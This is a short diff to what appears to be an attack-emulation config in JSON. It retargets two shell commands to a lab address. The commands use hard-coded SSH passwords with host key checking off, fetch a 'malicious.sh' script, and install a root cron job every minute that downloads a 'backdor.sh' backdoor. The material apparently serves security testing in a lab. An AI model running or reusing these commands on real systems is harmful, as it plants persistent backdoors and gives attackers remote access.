@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://example.com/malicious.sh | cat'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://172.21.0.20/malicious.sh | cat'"
       }
     ]
   },
@@ -190,7 +190,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"wget http://localhost/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"wget http://172.21.0.20/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
       }
     ]
   },
